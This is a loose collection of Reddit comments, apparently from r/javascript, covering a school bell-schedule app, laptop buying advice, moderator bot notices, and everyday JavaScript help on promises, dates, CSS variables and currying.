Yeah, I was surprised when I was researching this that not many other people have made something like this. I did have a talk to the folks at classclockapp.com about potentially integrating with their app too, so we‚Äôll see where that goes.
Remember us when you're a billionaire, don't go Zuck on us. :)
Haha this is awesome! Do you still have the code for this? I‚Äôm interested in how you were able to get a school schedule into an iCal format since I‚Äôm thinking of adding a block day calendar to ClassClock.
r/AccidentalRascism
Thanks for the info mate, loved your work
This. Tried it once for for dynamically altering an existing angular component and it was disgusting. HTML is ez mode. Why burden yourself?
my website is an empty white page checkmate
If you or any of your fellow students or teachers are interested in receiving an email when the app is ready, there‚Äôs a form on the landing page. Thank you so much for your support!
Why?
Of course not. Even though this app is super early stages, I‚Äôm doing as much as I reasonably can to respect the privacy of people using the app. The analytics I have installed on the sites is not affiliated with google and is set up to respect Do Not Track headers and zero out the last two bytes of all IP Addresses.
Thanks! If you‚Äôre interested in contributing to ClassClock, feel free to join the slack workspace or fork the app on GitHub. New contributors are always welcome!
Nice work, you chose a great demo song to show off your creation
Solving problems...this what its all about
Just in case. Not saying anything will happen, but anything you say in public can and will be used against you in court if it comes to that. Now its extremely unlikely your teacher will sue you or whatever lol, but better safe than sorry.
Yep, that‚Äôs the programming life haha
Hi /u/alkane_lol, this post was removed. Since we are a programming subreddit, there are very few instances where visual media is valid content for /r/javascript, including screenshots, demos, etc. Memes and other low-effort content are already prohibited. Please use the `submit a new link` option with a valid source URL, whether it's the project homepage, a blog post, etc. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/javascript) if you have any questions or concerns.*
yeah, good point....
"Feature, not a bug" my friend
The funny thing is, the app pulls the time from the device its being viewed on. One of my teachers who uses it has the time set wrong on her district computer and the settings are so locked down that she can‚Äôt change them. So whenever she puts ClassClock up on the board ClassClock it‚Äôs about a minute off.
Congrats you invented nosql... I kid I kid
This sounds like a similar situation at my school where a disconnected building is not hooked up to the bell system. üôÑ
SPOILERS AHEAD!!!
https://mapsson.com üòé
No spoiler üíÄüï∫
* Bad naming - name of variable / function says one thing, actually does / used for another thing... oops, I didn't know settings this value in this serializer writes to the database! * Spaghetti dependency - code in layer A calls code in layer B, which calls more code in layer B, which calls layer A, which then calls layer C... feature breaks when modifying something seemingly unrelated in layer A. * Unnecessarily complexity - instead of going from A to B, let's go from A to Z to F to G to Z to D to B... why are we splitting a string into an array of characters (strings), appending 'A' to the array, then joining them back, just to append 'A' to the string, when the language supports string concatenation? Even worse, unnecessarily complex architecture / design patterns designed to solve bigger problems adopted with poor understanding, to solve simple problems...
Just wanted to get the news of the update out there. Feel free to share, clone, fork, star etc.. Happy hacking :)
MUAHAHAHAHAHA I FOUND YOUR REDDIT ACCOUNT LES GOOOO (I know OP, huehuehue)
Hi /u/austinmrs, this post was removed. Since we are a programming subreddit, there are very few instances where visual media is valid content for /r/javascript, including screenshots, demos, etc. Memes and other low-effort content are already prohibited. Please use the `submit a new link` option with a valid source URL, whether it's the project homepage, a blog post, etc. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/javascript) if you have any questions or concerns.*
[removed]
What's it built on? React Native? I take it is since in Js subreddit. Very well done. Looks very nice.
The app is currently just using vanilla JS on an HTML/CSS site, although im hoping to transition to react for the next version to hopefully make development easier as the app grows
This reminds me of a little project I‚Äôd written using IntelXDK and Cordova, at Uni for my group of friends. I still have the calendar it generated, on my GCal. Brilliant idea. I‚Äôd happily contribute to this if it‚Äôs Open Source, plus be a backer as well. Going paid is a good idea, but at the same time, you can keep it open source. Something like the GitBook model.
Biggest fan of that menu button css transition
Who came up with `allSettled` as the name? How is this different than Bluebird's `finally`, other than the latter being a much better name for the function?
The ClassClock code is already on GitHub. If youre interested in contributing, you can join the slack workspace (link at the bottom of the landing page). Thank you so much for your support!
Unfortunately I did not make that. That menu button was part of the free styleshout template that I used to make the landing page.
I don't think i get the main function, what exactly does it do? You can already get the exact data you need to draw this.
Maybe I lack imagination but could you name any use-cases for this. From what I understand the devtools cover all of this already?
Congratulations, really nice work. Just a thing, you should fix the website navbar. The menu icon and the web logo are not aligned. Again great job üí™
Updated. Thanks for noticing that haha
Sure thing mate.
Worked on an old AS3 project. It had been developed for 6 years and involved a few perm devs and countless freelancers. It had FOUR tween libraries and 2 pdf loading libraries to name a few. Also had the longest inheritance chain I've ever seen: 28. Yep, that's right. 28 sub-sub-sub... n+..! I ran the whole thing through a line-counter I wrote in Go and it came up with just under 2 million lines of code. The solution? I re-wrote the whole shebang in javascript (well, Typescript) and css.
[https://cmdcolin.github.io/travigraphjs/?com=0&amp;end=5000&amp;repo=facebook%2Fcreate-react-app&amp;start=0](https://cmdcolin.github.io/travigraphjs/?com=0&amp;end=5000&amp;repo=facebook%2Fcreate-react-app&amp;start=0)
To be fair, unless you plan on doing any ML with JS, you don't require too many resources, I usually recommend anything with 8GB RAM for future proving, hard drive space is meh, then process speed is usually arbitrary, +3.2GHz whatever, i3/i5 min (coming from a Windows user).
Isnt 8gb too small? The new samsung galaxy has 12 :D and about the processor speed what do you mean by 3.2 GHz? The turbo boost?
If you can get your hands on a 16gb 13‚Äù air I recommend it. The trackpad on the 15‚Äù makes it difficult to type.
Btw, why are there macbook pro and air? What is the main difference?
Tbf there's a difference between capacity and read/write speed and more than laptops/desktops best smartphones at, similar with CPUs and GPUs comparing Laptops to Desktops, also phone manufacturers do that mainly because they can, not because they need to (need to being phones are so resource intensive). And by 3.2GHz I mean base clock speed, definitely should be fine, JS is actually quite lightweight (although can be as resource intensive as you like if you want) and editors such as Visual Basic Code (which I highly recommend) take up barely any disk space.
Air is smaller and ought weight but it‚Äôs good enough for programming. I like it because the trackpad is smaller so my palms do t hit it when I type.
DO NOT buy a macbook right now, the keyboards are a disaster. Wait for apple to fix them. [The MacBook keyboard fiasco is way worse than Apple thinks ](https://m.signalvnoise.com/the-macbook-keyboard-fiasco-is-surely-worse-than-apple-thinks/)
anything with SSD and 8+GB ram is good.
I was about to say
Another user reccomended the macbook air and the newest one has i5-8210 I found that on the internet: The Core i5-8210Y has a higher base frequency (1.6 GHz vs 1.3 GHz), but a lower max turbo frequency (3.6 GHz vs 3.9 GHz). Is that enough?
Max turbo should be more than fine, I'm not use to specific Mac terms, I assume that's juzt optimised overclocking, either way it sounds decent enough and should last a few years, even with 4-6GB of RAM at minimum tbf (but would suggest 8GB as a general recommendation for most things... Especially Chrome).
If it has to be a Mac, get a used one without the butterfly keyboard (I think it's the ones before 2016). That keyboard is worthless (in all revisions), even when it's not broken (which is rare).
If you are writing javascript that uses 100% CPU on anywhere near a 3.6GZ CPU - your doing it wrong
I use external monitors 95% of the time, so this is not a problem for me, but thanks :)
Absolutely love this, would love to incorporate it to my (VueJS) website one day!
Hi /u/alkane_lol, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Boost/turbo clock isn't even slightly a Mac specific term.
Fair, I guess it's just another term for overclocking though, which I mainly see.
It won't stay anywhere near that speed for very long, anything taking more than a few seconds will probably drop it right back down to under 2 GHz.
Is there a reason it has to be a mac?
Only kind of. Generally it means the CPU will go up to that speed for very short amounts of time before thermal throttling, which is great for very quick bursts of use like loading a web page, but anything that takes more than a few seconds will drop the speed way back down, especially on macbooks with their less than ideal cooling.
Listen to this guy
Why do you need a MacBook? Why? I use POP OS! in a HP Pavilion 15 and a Mac Mini 2014. macOS is devil in comparison. It's sort of better than Windows 10 but also worse in terms of window management. My advice get a reasonable Windows laptop and put Linux on it. Linux is really good for web development, you'll need to know some command line stuff in web development so it's good practice I'm thinking of either ditching the Mac Mini 2014 or installing Linux on it. I'm in to recycling tech now, we all consume too much these days, you can get so much out of older tech if you know what you're doing. Apple are hipster mentality crap. macOS is over rated and has poor design choices. So what MacBook should you buy absolutely none, there's much better choices available at much less cost.
Windows is the only OS i have ever used and wanna try something new. Linux seems too not fun :D
You should probably add a screenshot, demo or something and explain further what it does. I looked around a bit and *think* I know what it *might* do. But that‚Äôs not enough to convince me to download and use something. Edit: Googled a bit and figured out what a ‚Äùsnackbar‚Äù component is (odd name choice) but I reckon my point still stands.
You going to do JS dev . . . If it's for web or node, that question doesn't matter because the environment is the same. If you're wanting to do it for the personal experience, and you have the $$, then yeah go for it. But the end result of doing it for the dev is no different. It's the same internal JS requirements regardless of the OS because it's the same Node. And the OS has no bearing on major browsers either. I say this because of the difference in price of a current Mac over a current Win 10 laptop. You could seriously get a $100 windows 7 laptop off of craigslist and Get Things Done with learning JS. # On the other hand. . . If your wife/parents said you can get a new laptop for learning js, then yeah I will certify directly that it requires a $2000 macbook.
Are you using ticks or quotes? If you reference a variable ${var} then you need ticks ‚Äú`‚Äù and not a single quote.
Take a look at [https://developers.google.com/web/tools/chrome-devtools/javascript/](https://developers.google.com/web/tools/chrome-devtools/javascript/), you want to set a breakpoint on that line of js in your source via the chrome developer source tab, then reload your page and when it pauses on that line, hover your mouse over the vars and see if any of them are not as expected e.g NaN, 0 etc.
Looks good and could definitely be useful in some projects! Thanks :)
I want mac for the experience. The move from android from iOS was awesome and I imagine it will be the same with laptops. Btw i am already have 2 years of profesional experience with js
YES! It was the tick marks. Thanks!
YES! It was the tick marks. Thanks!
$2k will get you a decent MacBook Pro. Make sure you have enough money for Apple Care as well. Non warranty MacBooks can be super expensive to fix. I don‚Äôt understand the Mac hate. OSX is generally way more stable than Windows and similar quality Windows laptops are also expensive.
What do you mean by decent macbook pro? What year? CPU? RAM?
\*First real open sourced framework Perhaps, I'm not convinced that apollo was before relay.
I would get a 15-inch Retina...you can get one close to $2K refurbished from Apple and you should be able to get Apple Care on it: https://www.apple.com/shop/refurbished/mac/macbook-pro Get the highest spec that you can afford basically. They‚Äôll all be fast enough. I wouldn‚Äôt get less than 16GB RAM...despite what that other person said, the more RAM the better, especially if you like to keep a bunch of apps open at the same time.
I am from bulgaria and cant get refurbished from apple. It has to be a new one :(
You either need to use `async` before the assignment, or do the console.log in the `then` function.
``` var myvar = myfunction().then(res =&gt; { return res; }); ``` Burn this into your brain... you cannot do this. The stuff that's happening in then() is completely unsyncronized with the outside, in other words, the function you are calling from could be long gone by the time this returns. In other, other words, once you are are on the promise ride, there is no getting off.
I use no framework, except Bootstrap styling. When developing Cordova apps I only use JavaScript, direct DOM editing, HTML(5) and CSS(3), and no framework, except my own tiny HTML abstraction. Works for me.
Well you can get a brand new quad core from Apple 13-inch for $1,800 and they upgrade it to 16GB for $200. So that‚Äôs a $2K setup right there. Some retailers sell certain models a couple hundred dollars cheaper than Apple, so you may be able to find a better deal.
First day of my last job was spent with a long-standing developer. I asked for some help getting started with the application code and was told it was self-documenting. Every variable which was trick to name succinctly was 'humorously' named things like 'bob' and 'jeff'. So wtf is a 'jeff' I have to ask, just to hear about some underdeveloped concept which was only complicated because it hadn't been thought about properly. I had to go with the flow on this as business weren't willing to rewrite this shite. A few months later and I was creating 'jeff' tables in a new database and ETL processes for converting 'bobs' into their constituent 'teds'. Killed me a bit.
Most of the stuff I saw were just 2 core. Is that really bad?
Well you picked a solid template
It depends on what you are doing. Most software is not optimized for multi-threading...so how significant the core increase benefits you will strongly depend on which applications you run. Overall, a high clock speed dual core will perform just fine for many general purpose applications.
Just a nitpick - your API could be a little better. See: https://eslint.org/docs/rules/no-new
Well if you have it deploying with webpack, there are roughly two options if you want it actually running on the interviewer's machine. 1. Interviewer installs (or already has installed) Node, runs `npm ci`, and `npm start`. 2. You package up the full application into a Docker Image with an exposed port, and the interviewer pulls and runs that image in a container. Node projects don't compile to machine code (unless they're JIT compiled by the javascript engine), so "compiling and running" isn't really an option (other than the compilation from typescript=&gt;javascript that either tsc or babel is handling for you as part of webpack pipeline). The other option is, since your dev server is through webpack and thus super trivial, to just compile it in a branch on your github and use github pages to serve up the page(s). Or deploy your app to Heroku or some other free or cheap hosting service.
[I think this is the latest release](https://facerepo.com/app/faces/details/math-test-1575ca93419). I didn't really do a lot with it once it was done. I use WatchMaker which has support for calendar built in so I can't take the credit for that. The logic is some horrid if LUA statement (which this is my first and only time using LUA).
Thank you for your reply. I think I will go with your last option!
I've written a couple of guides to TDD that you might find useful: * [One weird trick that will change the way you code forever: JavaScript TDD](https://jrsinclair.com/articles/2016/one-weird-trick-that-will-change-the-way-you-code-forever-javascript-tdd/) and * [A Gentle Introduction to Javascript Test Driven Development](https://jrsinclair.com/articles/2016/gentle-introduction-to-javascript-tdd-intro/)
What does "structured" in this use case represent? It is unclear from the documentation or demonstration what it is intended to mean.
Hi /u/AlbertIsAProgrammer, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/rockaxe2018, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/weedisallIlike, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/yovchokalev, this post was removed. Prohibited low-effort content includes: * Questions that are easily Google'd. * Memes, jokes, etc. Please post to /r/ProgrammerHumor instead. * Most images and gifs. * [Listicles](https://en.wikipedia.org/wiki/Listicle), "Curated lists", and similar content. * Polls, surveys, etc. unless from an accredited academic body or trusted source (StateofJS, etc.). Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Yeah, it's going to be hard but there is a generally positive feeling. Thanks for the well wishes!
This is far worse, with a worst case time of O(Infinity). https://rosettacode.org/wiki/Sorting_algorithms/Bogosort#JavaScript
Cool! Take a look at the React component examples here. Hope to create some Vue examples soon too. [https://github.com/williamngan/pts-react-example](https://github.com/williamngan/pts-react-example)
&gt; like saying you probably shouldn‚Äôt use a pen and paper without first understanding how to make a paper and pen from scratch. It's true, articles like these are so pretentious and annoying. Like at that point, why use JavaScript when you could just learn Assembly?
What is this witchcraft
hmm isn't the link I gave a demo itself?
Any project that starts with npm can balloon out of control. I have to admit that I'm very spoiled by Vue, though. One thing I've been trying to do lately is start by using vanilla JavaScript and only add a framework if my vanilla code gets unwieldy.
Sounds like a basic parser.
Write a function that builds an array from the text input then compare that to your existing array. Check out the split() method to get started.
Thank you
Hi /u/GuardianOfSecrets, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Hi /u/ctlemon83, this post was removed. * For help with your javascript, please post to /r/LearnJavascript instead of here. * For beginner content, please post to /r/LearnJavascript instead of here. * For framework- or library-specific help, please seek out the support community for that project. * For general webdev help, such as for HTML, CSS, etc., then you may want to try /r/html, /r/css, etc.; please note that they have their own rules and guidelines! ---- /r/javascript is for the discussion of javascript news, projects, and especially, `code`! However, the community has requested that we not include help and support content, and we ask that you respect that wish. Thanks for your understanding, please see our [guidelines](http://www.reddit.com/r/javascript/wiki/index) for more info.
Pretty sweet, thanks for sharing.
Fairly certain alert is never a good idea?
Good point, the API has been updated in v1.1.0
it's a language construct, no library can implement their own version of `if` or `for` either. Object spread, lambads etc.. are both syntactic sugar that I also see no issue with. ``` Promise.all([dataAsPromised1, dataAsPromised2, dataAsPromised3]).then(v =&gt; { const [res1, res2, res3] = v; return res1+ res2+ res3 }); ``` I thoroughly agree that the async version is much clearer
Nothing about this question makes sense.
The config.js file references a server API public key... which API is this for, and where do we register for it?
No, they are drastically different. Return provides the output of the function, while alert merely pops up a little box in the browser. Alert has mostly fallen out of use because it can't be styled or have any other behavior besides showing plain text and being closed. Alert has been abused by scammy sites to name it extremely difficult to leave, so that's just another reason for ethical developers to avoid it.
I think you got something mixed up. In JavaScript, all functions return a value, every time they are called. If you don‚Äôt specify the return value by using the return keyword, it returns undefined. If you use the return keyword, it will return the value (e.g. return ‚Äòtest‚Äô will return the string ‚Äòtest‚Äô). The function ends with the return keyword, so everything after that will not be executed. Alert is a function that just opens an alert in the browser, containing the string that you passed as an argument. It does not specify a function‚Äôs return value and does not end the function.
Your problem is you shouldn't be changing your key. The point of a key value pair is to store the key as something to remember and reference back to, then change the value. Your setItem calls should look like so: `localStorage.setItem("theme", "theme-dark");` `...` `localStorage.setItem("theme", "theme-light");` &amp;#x200B; That way you don't have to do localStorage.clear(). Also your .getItem call at the end of each click function doesn't do anything so you can get rid of those.
And most importantly domain should be http(s)
Um, why no Binary Heap so you can traverse the lowest H? Seems inefficient.
Understood!
My confusion thank you
This is a lazy implementation. An efficient one will copy paste from here: http://eloquentjavascript.net/1st_edition/appendix2.html
Stooorm spirit!
Lots going on in life, but I definitely suggest checking out Ed-Fi.
`1e9`
The most direct use-case is inside a CMS (e.g. WordPress) or a Wiki. Anywhere you have the option to edit a CSS file, you could have a toggle between `Plain`-view and `Style Editor`-view. Perhaps a less experienced user would prefer the visual editor: - easy commenting - pretty indents - validation - dropdown suggestions (on the wishlist, not a current feature) - color picker Other less obvious use-cases: - a possible alternative to CSS colorizers (e.g. [PrismJS](https://github.com/PrismJS/prism), [highlight.js](https://github.com/highlightjs/highlight.js)) - a possible alternative to CSS prettifyers/beautifyers - a possible alternative to CSS editors (e.g. [CodeMirror](https://github.com/codemirror/codemirror)) - a possible alternative to CSS parsers (a ton of them) - a way to surgically edit a minified CSS - a way to comment-out large sections of CSS code that itself contains comments The `StyleEditor` is in fact an interesting combination of two DevTools features: - the RuleView that you get when you "Inspect Element" is most similar to the `StyleEditor`, but more limited (it can't disable rules, it doesn't show nested @media, it doesn't support copy/paste of blocks, etc.) - the Sources Panel offers a plain view of a CSS file, but it doesn't offer checkboxes for easy commenting, keyboard shortcuts (e.g. up/down to increase a numeric value) or validation.
for push notifications https://developers.google.com/web/fundamentals/codelabs/push-notifications/
This doesn't substitute `finally`. It needs a different name because it does a different thing.
Hah, sorry, it was obscured by the UI of the Reddit app (iOS). Could perhaps be better to have a button to manually show it? Yes, I‚Äôm not saying there is no description at all, just that it doesn‚Äôt really explain much. You could at least include the code for the 3 on the page.
The structured mode adds some minimum styling for the labels, hints, and error messages.
\&gt; Web App Manifest &amp;#x200B; no
I built a small font customizer app with Vuejs which allows to get the CSS code styling of a sample text. &amp;#x200B; Check it out here! [https://manuel-suarez-abascal.github.io/font-customizer/](https://manuel-suarez-abascal.github.io/font-customizer/)
documents.getElementById('elementId').style.property That'll definitely get/set it for that element, but not necessarily change the CSS for ever other element sharing the same class in CSS.
That unfortunately doesn‚Äôt get the property when it was set in the CSS rather than in the javascript using the same .style.property. Any ideas about why an extra space is being returned and how to fix it?
Is it a simple case of there being a space after the property, like "color: red;" instead of "color:red:"? Probably a stupid question but could be it, potentially, just a thought
The fact that in both Firefox and Chome, white space(s) between the colon and the semicolon, are considered as part of the value, I could only conclude that it's what the CSS specification tell web browser implementers. Why it behave like that? Only the ones who made the CSS specification can answer that. Otherwise, it would be just a speculation or an assumption. Also, it seems that the CSS specification doesn't fully specify how to handle white spaces and quote characters too. For example: :root { --myVariable: 'a' ; /* 5 spaces, 'a', 3 spaces */ } In Firefox: let a = getComputedStyle(document.body).getPropertyValue("--myVariable"); console.log(a.length, "_" + a + "_"); //output: 11 _ 'a' _ In Chrome: let a = getComputedStyle(document.body).getPropertyValue("--myVariable"); console.log(a.length, "_" + a + "_"); //output: 5 "_ "a" _" This means that because of incomplete CSS specifications, browser implementations on handling this matter do not work the same way. i.e. the result is inconsistent across different browser engine. So for CSS variables (i.e. custom CSS properties), I highly recommend applying a workaround for this problem by removing any leading and trailing white spaces from the retrieved CSS value using regular expression. e.g. let a = getComputedStyle(document.body).getPropertyValue("--myVariable").replace(/^\s+|\s+$/g, ""); Note: `trim()` shouldn't be used for this, because it doesn't remove new-line characters.
Hey to all, thank you for clicking on my video first of all! I just wanted to write here and make sure this is understood: I do not condone spamming or botting, this is just a fun video for learning purposes!
Thought that too but unfortunately still same issue.
Thanks for the explanation. If you don‚Äôt put any space between the colon and variable value shouldn‚Äôt there be no space in the output? I still get the space.
Saved you a click: Conclusion: We don't know and it doesn't matter apperently.
Not when I tested it locally in my system. Chances are that something else is interfering. e.g. CMS, where CSS got prettyfied. Check the CSS received by the browser to see if it actually the same as the one in the server.
microsoft actually provides a tool to fo this easily https://www.pwabuilder.com
I don't think u/smartgenius1 was trying to say that you shouldn't use a constructor at all, just that it shouldn't insert the DOM element. That should be left to another method
That was also my opinion before reading your comment
Since this is dealing with basic elements, I presume the gzipped size is pretty small? I would check but am on my phone.
[A small gist](https://gist.github.com/aungerh/5c7396f440cd9a624af27a79b9a4ba77) dedicated to currying functions I made a while back:
&gt;My own solution usually includes some template strings and a global helper to re-render the whole page. This works reasonably well, but I wonder if there are more well-known alternatives? This is the main problem when going frameworkless, there's no efficient patching/diffing so you lose DOM state like focus, scroll, etc.
waoo nice tutorial.. ThankYou
There's no alternative, making scaleable applications in vanilla JS just isn't feasible, and once you have abstracted it just enough you have just created another framework, one that will probably cause more bundle weight than battle-tested solutions. I would just let it go and use something like Preact, if it's really the size that bothers you. 3kb will not cause you any trouble, not that Reacts 30 would, but 3 is literally nothing. Or Svelte. Literally anything over making apps with raw dom apis.
If you still got the error, you can try reproducing it on a basic setup and filing a bug report.
Gotcha.
I think you are using the wrong format. Instead of YYYYMMDD try YYYY-MM-DD.
You are telling it to just parse the date, if you look at the actual value its time will be 00:00:00, so the comparison is against the start of today in your example. &amp;#x200B; If I were to do the same, I would get 13 hours ago (BST tz) and it is 13:18 right now.
The real LPT is always in the comments
Hi /u/FlegBar, welcome to reddit! Unfortunately, this post was removed because you are a new user. This is a spam-prevention measure, we hope you'll understand. You'll be able to post in a few days, however, you can start commenting now! We'd love to get to know you. In the meantime, please read the site [reddiquette](http://www.reddit.com/wiki/reddiquette) and [/r/javascript's guidelines](http://www.reddit.com/r/javascript/wiki/index). Also, **/r/javascript is not a support channel.** For help with javascript, please post to /r/LearnJavascript instead. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/javascript) if you have any questions or concerns.*
Hi! simply changing the format to YYYY-MM-DD HH:mm A is still giving me the same issue. and you said I was merely parsing the date but isn't the fromNow() function supposed to give the time difference from the current time? And it seems to be doing just that but clearly the difference I am getting is incorrect.
Works correctly for me: [https://jsfiddle.net/ya65k72L/1/](https://jsfiddle.net/ya65k72L/1/)
Alright! My apologies. further debugging has allowed me to identify it is an issue with the backend instead and not moment js library. Thank you for the time and effort! My django app is storing the date by maintaing the timezone difference separately. So I return the time that does not factor in my local time in Pakistan. Thank you all once again.
I'm not entirely familiar with moment, but is that 2nd parameter not telling it how to parse the date? In which case you are just giving it date arguments, it wouldn't know how to parse the rest. Loading moment website to play in the console gives me. &gt; var value = "2019-05-06 11:20 AM" undefined &gt; moment(value, "YYYYMMDD").fromNow() "14 hours ago" &gt; moment(value, "YYYY-MM-DD HH:mm A").fromNow() "2 hours ago" Doing a couple of different calls shows what I expected is definitely the case. &gt; moment(value, "YYYYMMDD").format() "2019-05-06T00:00:00+01:00" &gt; moment(value, "YYYY-MM-DD HH:mm A").format() "2019-05-06T11:20:00+01:00" In your parse format, you can clearly see moment believes the time from your input is `00:00:00`. As I mentioned, you can also see moment is making an assumption about the timezone being local, which if you are passing this value from a server, you may run into problems with this unless you move to a standard format for date serialisation.
[removed]
Hi /u/sacredthemes, this comment was removed because you used a URL shortener. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/javascript) if you have any questions or concerns.*
Which is better? Veu or Vanilla? Does it useful for Static sites? [HTML site](https://themeforest.net/item/coinpool-ico-and-crypto-currency-html-template/22973177?s_rank=1)
You can use standards-based web components to encapsulate the individual parts of your application. You can then consume them declaratively using regular old HTML. If you want easier React-like templating inside your components without taking a dependency on a framework, use a library like LitHTML. You still need polyfills to make this work in IE, but it will work natively practically everywhere else, including mobile environments.
Moment is never wrong.
Yeah I know, but I want a simple API, so I prefer calling a function directly.
Except when it introduces security vulnerabilities ;-)
What do you see as the shortcomings of Web App Manifests?
Most components are basic elements, but there are some components like datepiker, drop zone and phone input that rely on third party libraries and augment the gzip size
That is merely the Mandela Effect, merging Moment from one universe with the security vulnerabilities of another.
Currying is much more useful when it‚Äôs automatic, e.g. as it is in Haskell and ML. But it‚Äôs still useful to understand in languages where you need to do it manually such as JavaScript.
I agree with you. It's always easier to complicate things than to simpify it though, so that might be part of the issue.
I'll keep this in the frontend space and ignore issues like new programming languages and the like. I am not so much frustrated as I see the frontend moving more and more to a code less world. Most libraries are just wrappers to make things "easier". Pretty soon we'll have wrappers for those wrappers. It seems we are headed for a place where drag and drop become the norm. I am not for that world and maybe I am wrong, just seems like the path.
Hi /u/adamrshaw, welcome to reddit! Unfortunately, this post was removed because you are a new user. This is a spam-prevention measure, we hope you'll understand. You'll be able to post in a few days, however, you can start commenting now! We'd love to get to know you. In the meantime, please read the site [reddiquette](http://www.reddit.com/wiki/reddiquette) and [/r/javascript's guidelines](http://www.reddit.com/r/javascript/wiki/index). Also, **/r/javascript is not a support channel.** For help with javascript, please post to /r/LearnJavascript instead. *I am a bot, and this action was performed automatically. Please [contact the moderators of this subreddit](/message/compose/?to=/r/javascript) if you have any questions or concerns.*
These people aren't just reinventing wheels because they feel like it. They're solving problems that they're having. Often, that means finding a solution that someone else has used and adapting it to your situation. Why didn't everyone just use Angular and not invent React or Vue? Because React and Vue do things differently from Angular and some people prefer it. We live in an age when things are progressing more rapidly than ever before in history. Almost every week, I learn about some new things that makes me exclaim that we "live in the future!" and how much I love it. I don't get upset that cancer hasn't been cured, that we haven't settled on the perfect pizza toppings, or that nobody has invented a new programming paradigm and used it for JavaScript in the last 5 years. Things are progressing at break-neck speeds already, and I'm content to be along for the ride.
What's currying?
I think you're wrong. React didn't exist as a concept, for example. Neither did thousands of JS libraries that are so reliable, you can package hundreds of them, and your overall project doesn't break (most of the time). We have tons of extremely reliable open source packages that we could only dream of in the 90's and 2000's. We have freaking Tensorflow.js that runs on GPUs! We have freaking webassembly, and tons of projects prove that you can compile complex codebases down to it. I can keep going, there are so many exciting JS libraries, it's nuts.
Isn't the second half of that gist covering HOC's and not currying? I thought the principle behind currying was that each function could only take one argument and return another function. Or am I misunderstanding something and HOC's and currying are somewhat linked each other?
He didn‚Äôt give an answer (at least in some written form besides code), but basically a curried function is a function with multiple args, that it takes one at a time, not all at once.
Every article that has a question for a title, the answer is NO
100% agree. I come from AS3 too and I feel very lucky about it, as it was a great introduction to a 'real' programming approach applied to rich frontend experiences (and it was FUN). I actually feel there's nothing achievable today that we couldn't do 10 yrs ago..
I don't think this is the case. And it's so weird to me when people talk of the good old times as if there was no separation or hardship when everything was quite literally separated. The newer technologies are bridging gaps we wouldn't have thought are possible to cross. Especially with React. It all goes towards one unified standard which isn't tied to a specific framework, language or a platform any longer. This had already lead to tools that close the longstanding gap between developers and designers (for instance Framer). And being able to share components across platforms that couldn't be more different is something we were never able to do before. Not like today where i can pick any random package in the eco system and just use it on any platform i want. A React animation library animates React components, not the dom, not a div. If i want it to animate mobile views, boxes in a shell window, vertices in a VR world, or diodes on a electrical board - then i can do this. Same applies to each and every component that isn't tied to host specifics. The separation is all but disappearing. Angular, as great as it is, was never intended to go beyond the single platform it caters to, you won't find the innovation there.
It's also called partial application. Basically it means you take a function, supply some of its arguments now, and then you get a new function which you can supply the remaining arguments to that new function later. Here's a very simple implementation. `curry` here is a function that returns a new function. function curry(fn, ...args) { return fn.bind(null, ...args); } function addNumbers(a, b) { console.log(a + b); } let add2 = curry(addNumbers, 2); // Equivalent to addNumbers(2, 3); add2(3); // -&gt; 5
Definitely not. Unless you're building a really simple application. It's faster to type logic than drag and drop logic gates.
A curried function, is a function that when supplied with less than the full number of arguments, stores the provided argument values and returns a new (also curried) function that accepts the missing arguments.
[Here is a very nice writeup about currying](https://fr.umio.us/favoring-curry/) (written by the Ramda guys, aka the go-to JS FP library)
